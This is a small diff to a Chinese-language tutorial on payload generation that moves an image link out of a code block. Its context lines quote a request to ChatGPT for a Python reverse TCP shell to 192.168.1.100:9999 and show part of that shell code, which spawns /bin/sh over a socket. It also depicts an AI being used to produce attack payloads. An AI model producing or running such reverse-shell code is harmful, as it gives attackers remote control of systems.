@@ -37,6 +37,9 @@ Payload生成是指创建能够在目标系统上执行特定任务的代码或�
 “请为我生成一个Python3的反向TCP Shell代码，用于连接到`192.168.1.100`的9999端口。”
 
 **ChatGPT可能生成的代码示例**：
+
+![](img/815be9b5b57e8aa0f87dab2ee18020ee_0.png)
+
 ```python
 import socket
 import subprocess
@@ -49,9 +52,6 @@ def reverse_shell():
     os.dup2(s.fileno(), 1)  # 标准输出
     os.dup2(s.fileno(), 2)  # 标准错误
     subprocess.call(["/bin/sh", "-i"])
-
-![](img/815be9b5b57e8aa0f87dab2ee18020ee_0.png)
-
 if __name__ == "__main__":
     reverse_shell()
 ```
